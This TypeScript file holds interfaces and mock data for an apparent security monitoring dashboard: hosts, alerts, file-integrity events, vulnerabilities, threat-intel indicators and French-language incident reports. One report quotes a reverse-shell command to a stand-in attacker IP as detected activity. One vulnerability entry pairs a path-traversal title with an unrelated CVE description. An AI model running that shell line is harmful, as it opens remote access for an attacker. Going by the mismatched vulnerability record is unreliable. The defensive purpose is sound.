export interface Agent {
  id: string;
  name: string;
  ip_address: string;
  os: string;
  status: 'Online' | 'Offline';
  last_keep_alive: string;
  cpu_usage: number;
  ram_usage: number;
  version: string;
}

export interface SecurityEvent {
  id: number;
  timestamp: string;
  hostname: string;
  src_ip: string;
  dest_ip: string;
  dest_port: number;
  category: string;
  rule_id: number;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  action_taken: string;
}

export interface Alert {
  id: number;
  title: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  description: string;
  rule_id: number;
  timestamp: string;
  xgboost_probability: number;
  analyst_assigned: string;
  status: 'New' | 'Acknowledged' | 'Resolved';
  ai_report_id: number | null;
}

export interface AiReport {
  id: number;
  alert_id: number;
  generated_at: string;
  markdown_content: string;
}

export interface FimEvent {
  id: number;
  filename: string;
  hostname: string;
  event_type: 'Added' | 'Modified' | 'Deleted';
  old_hash: string;
  new_hash: string;
  modified_by: string;
  timestamp: string;
}

export interface Vulnerability {
  id: string;
  title: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  cve_id: string;
  cvss_score: number;
  impacted_agents: string[];
  status: 'Unpatched' | 'Mitigated' | 'Patched';
  description: string;
  remediation: string;
}

export interface ThreatIntelIOC {
  id: string;
  value: string;
  type: 'IP' | 'Domain' | 'Hash';
  threat_actor: string;
  description: string;
  date_added: string;
}

// Initial Mock Datasets
export const initialAgents: Agent[] = [
  { id: "agt-001", name: "soc-web-prod-01", ip_address: "10.100.12.45", os: "Ubuntu 22.04 LTS", status: "Online", last_keep_alive: "2026-07-18 15:42:12", cpu_usage: 24.5, ram_usage: 62.1, version: "Wazuh v4.7.2" },
  { id: "agt-002", name: "soc-db-mysql-01", ip_address: "10.100.12.46", os: "RedHat Enterprise 9", status: "Online", last_keep_alive: "2026-07-18 15:42:01", cpu_usage: 45.2, ram_usage: 81.7, version: "Wazuh v4.7.2" },
  { id: "agt-003", name: "soc-ad-controller", ip_address: "10.100.10.10", os: "Windows Server 2022", status: "Online", last_keep_alive: "2026-07-18 15:42:15", cpu_usage: 12.8, ram_usage: 55.4, version: "Wazuh v4.7.1" },
  { id: "agt-004", name: "rayane-virtual-machine", ip_address: "192.168.1.100", os: "Kali Linux 2024.1", status: "Online", last_keep_alive: "2026-07-18 15:42:25", cpu_usage: 68.4, ram_usage: 74.2, version: "Wazuh v4.7.2" },
  { id: "agt-005", name: "soc-mail-gateway", ip_address: "10.100.10.22", os: "Debian 12 Bookworm", status: "Offline", last_keep_alive: "2026-07-18 11:15:00", cpu_usage: 0.0, ram_usage: 0.0, version: "Wazuh v4.7.0" },
  { id: "agt-006", name: "soc-bastion-ssh", ip_address: "10.100.5.2", os: "Ubuntu 22.04 LTS", status: "Online", last_keep_alive: "2026-07-18 15:42:18", cpu_usage: 5.6, ram_usage: 28.3, version: "Wazuh v4.7.2" },
  { id: "agt-007", name: "soc-endpoint-rayane", ip_address: "10.100.40.115", os: "Windows 11 Enterprise", status: "Online", last_keep_alive: "2026-07-18 15:41:59", cpu_usage: 18.2, ram_usage: 44.9, version: "Wazuh v4.7.2" },
  { id: "agt-008", name: "soc-cloud-proxy", ip_address: "172.16.50.88", os: "Alpine Linux 3.19", status: "Online", last_keep_alive: "2026-07-18 15:42:08", cpu_usage: 8.9, ram_usage: 19.4, version: "Wazuh v4.7.1" }
];

export const initialEvents: SecurityEvent[] = [
  { id: 1, timestamp: "2026-07-18 15:40:44", hostname: "soc-web-prod-01", src_ip: "185.220.101.44", dest_ip: "10.100.12.45", dest_port: 443, category: "SQL Injection", rule_id: 100021, severity: "Critical", action_taken: "Dropped" },
  { id: 2, timestamp: "2026-07-18 15:39:12", hostname: "soc-bastion-ssh", src_ip: "45.142.120.9", dest_ip: "10.100.5.2", dest_port: 22, category: "SSH Brute Force", rule_id: 100004, severity: "High", action_taken: "Logged" },
  { id: 3, timestamp: "2026-07-18 15:38:01", hostname: "soc-ad-controller", src_ip: "10.100.40.115", dest_ip: "10.100.10.10", dest_port: 389, category: "LDAP Bind Request", rule_id: 200054, severity: "Low", action_taken: "Allowed" },
  { id: 4, timestamp: "2026-07-18 15:36:19", hostname: "rayane-virtual-machine", src_ip: "127.0.0.1", dest_ip: "127.0.0.1", dest_port: 8080, category: "Local Port Scan", rule_id: 300109, severity: "Medium", action_taken: "Logged" },
  { id: 5, timestamp: "2026-07-18 15:35:45", hostname: "soc-web-prod-01", src_ip: "192.168.1.100", dest_ip: "10.100.12.45", dest_port: 80, category: "HTTP Directory Traversal", rule_id: 100033, severity: "High", action_taken: "Dropped" },
  { id: 6, timestamp: "2026-07-18 15:33:02", hostname: "soc-db-mysql-01", src_ip: "10.100.12.45", dest_ip: "10.100.12.46", dest_port: 3306, category: "MySQL Admin Query", rule_id: 400102, severity: "Low", action_taken: "Allowed" },
  { id: 7, timestamp: "2026-07-18 15:31:12", hostname: "soc-mail-gateway", src_ip: "91.240.118.52", dest_ip: "10.100.10.22", dest_port: 25, category: "SMTP Spam Wave", rule_id: 500021, severity: "Medium", action_taken: "Quarantined" },
  { id: 8, timestamp: "2026-07-18 15:30:00", hostname: "soc-endpoint-rayane", src_ip: "10.100.40.115", dest_ip: "142.250.190.46", dest_port: 443, category: "DNS Query Exfiltration", rule_id: 100088, severity: "Critical", action_taken: "Blocked" },
  { id: 9, timestamp: "2026-07-18 15:28:15", hostname: "soc-cloud-proxy", src_ip: "8.8.8.8", dest_ip: "172.16.50.88", dest_port: 53, category: "DNS Amplification Response", rule_id: 100099, severity: "Low", action_taken: "Allowed" },
  { id: 10, timestamp: "2026-07-18 15:25:55", hostname: "soc-bastion-ssh", src_ip: "45.142.120.9", dest_ip: "10.100.5.2", dest_port: 22, category: "SSH Session Opened", rule_id: 100001, severity: "Medium", action_taken: "Logged" },
  { id: 11, timestamp: "2026-07-18 15:21:40", hostname: "soc-ad-controller", src_ip: "10.100.10.12", dest_ip: "10.100.10.10", dest_port: 445, category: "SMB Session Exploit Attempt", rule_id: 200089, severity: "Critical", action_taken: "Blocked" },
  { id: 12, timestamp: "2026-07-18 15:19:02", hostname: "soc-web-prod-01", src_ip: "185.220.101.44", dest_ip: "10.100.12.45", dest_port: 443, category: "TLS Handshake Failed", rule_id: 100002, severity: "Low", action_taken: "Logged" },
  { id: 13, timestamp: "2026-07-18 15:16:30", hostname: "soc-db-mysql-01", src_ip: "192.168.1.100", dest_ip: "10.100.12.46", dest_port: 3306, category: "MySQL Port Scan Detection", rule_id: 400109, severity: "Medium", action_taken: "Logged" },
  { id: 14, timestamp: "2026-07-18 15:11:15", hostname: "soc-endpoint-rayane", src_ip: "10.100.40.115", dest_ip: "31.13.72.36", dest_port: 443, category: "Unauthorized Proxy Bypass", rule_id: 100344, severity: "Medium", action_taken: "Dropped" },
  { id: 15, timestamp: "2026-07-18 15:08:22", hostname: "soc-web-prod-01", src_ip: "104.244.42.1", dest_ip: "10.100.12.45", dest_port: 443, category: "Cross-Site Scripting (XSS)", rule_id: 100022, severity: "High", action_taken: "Dropped" },
  { id: 16, timestamp: "2026-07-18 15:05:00", hostname: "rayane-virtual-machine", src_ip: "192.168.1.100", dest_ip: "192.168.1.1", dest_port: 53, category: "DNS Flood", rule_id: 300402, severity: "High", action_taken: "Logged" },
  { id: 17, timestamp: "2026-07-18 14:59:12", hostname: "soc-mail-gateway", src_ip: "10.100.10.1", dest_ip: "10.100.10.22", dest_port: 25, category: "SMTP Loop Detected", rule_id: 500055, severity: "Medium", action_taken: "Blocked" },
  { id: 18, timestamp: "2026-07-18 14:55:34", hostname: "soc-ad-controller", src_ip: "10.100.40.115", dest_ip: "10.100.10.10", dest_port: 445, category: "Kerberoasting Ticket Requested", rule_id: 200450, severity: "High", action_taken: "Logged" },
  { id: 19, timestamp: "2026-07-18 14:52:10", hostname: "soc-bastion-ssh", src_ip: "195.154.122.99", dest_ip: "10.100.5.2", dest_port: 22, category: "SSH Reverse Shell Check", rule_id: 100014, severity: "Critical", action_taken: "Killed" },
  { id: 20, timestamp: "2026-07-18 14:48:44", hostname: "soc-cloud-proxy", src_ip: "172.16.50.88", dest_ip: "203.0.113.5", dest_port: 8080, category: "Outbound Shell Connection", rule_id: 100650, severity: "Critical", action_taken: "Dropped" }
];

export const initialAlerts: Alert[] = [
  {
    id: 101,
    title: "SQL Injection Attack Detected",
    severity: "Critical",
    description: "An external entity (185.220.101.44) initiated a series of crafted GET queries containing 'UNION SELECT' and '--' sequences against 'soc-web-prod-01' database handlers, attempting schemas enumeration.",
    rule_id: 100021,
    timestamp: "2026-07-18 15:40:44",
    xgboost_probability: 99.64,
    analyst_assigned: "Rayane (SecOps)",
    status: "New",
    ai_report_id: null
  },
  {
    id: 102,
    title: "Persistent SSH Brute Force",
    severity: "High",
    description: "Bastion SSH service report over 450 failed authentication attempts within 3 minutes from IP 45.142.120.9 using lists of common administrative accounts.",
    rule_id: 100004,
    timestamp: "2026-07-18 15:39:12",
    xgboost_probability: 92.15,
    analyst_assigned: "Unassigned",
    status: "New",
    ai_report_id: null
  },
  {
    id: 103,
    title: "Kerberoasting Activity Detected",
    severity: "High",
    description: "Host soc-endpoint-rayane (10.100.40.115) generated multiple TGS requests for service accounts with weak RC4 encryption. Indicative of Kerberoasting credential recovery attacks.",
    rule_id: 200450,
    timestamp: "2026-07-18 14:55:34",
    xgboost_probability: 88.42,
    analyst_assigned: "Rayane (SecOps)",
    status: "Acknowledged",
    ai_report_id: 1
  },
  {
    id: 104,
    title: "Unauthorized DNS Tunneling Channel",
    severity: "Critical",
    description: "Endpoint soc-endpoint-rayane opened dynamic subdomains requests containing base64 data structures directed to external name server. Indicates potential data extraction tunneling.",
    rule_id: 100088,
    timestamp: "2026-07-18 15:30:00",
    xgboost_probability: 98.78,
    analyst_assigned: "Unassigned",
    status: "New",
    ai_report_id: null
  },
  {
    id: 105,
    title: "Outbound Shell Spawned from Proxy Node",
    severity: "Critical",
    description: "Active bash shell execution detected running under daemon service on soc-cloud-proxy node, connecting outbound to unauthorized TCP port 8080.",
    rule_id: 100650,
    timestamp: "2026-07-18 14:48:44",
    xgboost_probability: 99.89,
    analyst_assigned: "Rayane (SecOps)",
    status: "Resolved",
    ai_report_id: 2
  }
];

export const initialAiReports: AiReport[] = [
  {
    id: 1,
    alert_id: 103,
    generated_at: "2026-07-18 15:02:10",
    markdown_content: `# Synthèse de la Menace
L'alerte concerne une activité de type **Kerberoasting** sur le contrôleur de domaine Active Directory. Cette technique consiste à demander des tickets de service (TGS) chiffrés pour les déchiffrer hors ligne afin de récupérer les mots de passe des comptes de service en clair.

# Analyse Technique
- **Acteur de Menace** : Agent interne \`10.100.40.115\` (\`soc-endpoint-rayane\`).
- **Comportement suspect** : Requêtes TGS massives avec chiffrement RC4 (faible et propice au crackage rapide).
- **Impact** : Compromission potentielle des privilèges administratifs si un compte de service a un mot de passe faible.

# Playbook de Remédiation
1. **Désactiver RC4** : Configurer la politique de sécurité pour autoriser uniquement AES-128 et AES-256 dans Kerberos.
2. **Réinitialiser le mot de passe** du compte cible concerné avec une longueur minimale de 25 caractères.
3. **Isoler l'hôte** \`soc-endpoint-rayane\` du réseau interne pour inspection.`
  },
  {
    id: 2,
    alert_id: 105,
    generated_at: "2026-07-18 14:50:00",
    markdown_content: `# Synthèse de la Menace
Détection d'un **Reverse Shell** initié depuis la VM \`soc-cloud-proxy\` vers l'IP malveillante externe \`203.0.113.5\`. C'est un indicateur fort d'accès initial réussi par un attaquant suivi d'une tentative de commande et contrôle (C2).

# Analyse Technique
- **Processus Parent** : \`nginx\` (Web Proxy)
- **Processus Enfant** : \`/bin/bash -i >& /dev/tcp/203.0.113.5/8080\`
- **Modèle XGBoost** : Confiance de détection de 99.89%.

# Playbook de Remédiation
1. **Tuer la session TCP** : Bloquer immédiatement le port \`8080\` et l'IP \`203.0.113.5\` sur le pare-feu externe.
2. **Tuer le PID** suspect sur le serveur proxy.
3. **Inspecter le journal d'accès** Nginx pour trouver la vulnérabilité d'exécution de code à distance (RCE) exploitée.`
  }
];

export const initialFimEvents: FimEvent[] = [
  { id: 1, filename: "/etc/shadow", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "a438c89b7c843f019bd8ef2b8df11eab1901c89012a4ee3901b09bca3b22e11a", new_hash: "99cb1902bb3c80ff12a45c6020cde8e1abcf1902df35c46e392ca2bd11ff5a43", modified_by: "root", timestamp: "2026-07-18 15:40:02" },
  { id: 2, filename: "/etc/passwd", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", new_hash: "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", modified_by: "systemd", timestamp: "2026-07-18 15:37:12" },
  { id: 3, filename: "/var/www/html/index.php", hostname: "soc-web-prod-01", event_type: "Modified", old_hash: "ee284cf02a394feab8902cdbf3e4fcf50bcae390bd847290decf0e29d0f2a9e1", new_hash: "fcf023ab9bd84cf2a0cf3df84210e3fa0210bcdae394feabd2901cdbf834a9ef", modified_by: "www-data", timestamp: "2026-07-18 15:22:15" },
  { id: 4, filename: "C:\\Windows\\System32\\drivers\\etc\\hosts", hostname: "soc-endpoint-rayane", event_type: "Modified", old_hash: "7ea93dfa910ecbda39fe02adab129fec89320facbdf289fa30dbac90ab12f12a", new_hash: "f938dca098b1fe2a39fe28dca90fa8b27341fe023a8ffbde28fa7b09ca88f28d", modified_by: "rayane", timestamp: "2026-07-18 15:10:45" },
  { id: 5, filename: "/usr/local/bin/backdoor.sh", hostname: "soc-cloud-proxy", event_type: "Added", old_hash: "EMPTY_FILE", new_hash: "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", modified_by: "nginx", timestamp: "2026-07-18 14:45:00" },
  { id: 6, filename: "/etc/ssh/sshd_config", hostname: "soc-bastion-ssh", event_type: "Modified", old_hash: "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", new_hash: "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", modified_by: "root", timestamp: "2026-07-18 14:15:30" }
];

export const initialVulnerabilities: Vulnerability[] = [
  { id: "vuln-1", title: "OpenSSH Remote Code Execution (RegreSSHion)", severity: "Critical", cve_id: "CVE-2024-6387", cvss_score: 9.8, impacted_agents: ["soc-bastion-ssh"], status: "Unpatched", description: "A signal handler race condition vulnerability was discovered in OpenSSH's secure shell server (sshd) where a client can execute arbitrary code with root privileges.", remediation: "Upgrade openssh-server package to version 9.8p1-1 or modify SSH configuration to set LoginGraceTime to 0." },
  { id: "vuln-2", title: "MySQL Server Privilege Escalation", severity: "High", cve_id: "CVE-2023-22001", cvss_score: 8.1, impacted_agents: ["soc-db-mysql-01"], status: "Mitigated", description: "Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: Security: Privileges). Easily exploitable vulnerability allows high privileged attacker to compromise MySQL server.", remediation: "Apply Oracle Critical Patch Update for July 2023, or restrict administrative connections to localhost." },
  { id: "vuln-3", title: "Web Application Path Traversal vulnerability", severity: "High", cve_id: "CVE-2024-3400", cvss_score: 8.8, impacted_agents: ["soc-web-prod-01"], status: "Unpatched", description: "A command injection vulnerability in the GlobalProtect gateway of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.", remediation: "Install PAN-OS hotfixes or disable telemetry option until patching completes." },
  { id: "vuln-4", title: "Active Directory Domain Privilege Escalation", severity: "Medium", cve_id: "CVE-2023-38115", cvss_score: 6.5, impacted_agents: ["soc-ad-controller"], status: "Patched", description: "Windows Active Directory Domain Services elevation of privilege vulnerability. Allows a local domain user to escalate to Domain Administrator.", remediation: "Apply Microsoft KB5031364 KB update package." }
];

export const initialIocs: ThreatIntelIOC[] = [
  { id: "ioc-1", value: "185.220.101.44", type: "IP", threat_actor: "Tor Exit Node (Scanners)", description: "Active IP scanning and running vulnerability scanners against web proxy ports.", date_added: "2026-07-18 10:00:00" },
  { id: "ioc-2", value: "45.142.120.9", type: "IP", threat_actor: "China-based Brute Forcer", description: "Persistent SSH brute forcing targeting corporate routers and jump boxes.", date_added: "2026-07-18 11:20:00" },
  { id: "ioc-3", value: "203.0.113.5", type: "IP", threat_actor: "UNC2891 C2 Server", description: "Command and Control server associated with shell script backdoors.", date_added: "2026-07-18 12:45:00" },
  { id: "ioc-4", value: "bad-script-malicious.com", type: "Domain", threat_actor: "Phishing Anchor", description: "Domain used in spam emails to host payload configuration strings.", date_added: "2026-07-18 13:12:00" },
  { id: "ioc-5", value: "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", type: "Hash", threat_actor: "CozyBear Linux Backdoor", description: "SHA-256 hash of shell reverse shell backdoor payload placed in /usr/local/bin.", date_added: "2026-07-18 14:46:00" }
];
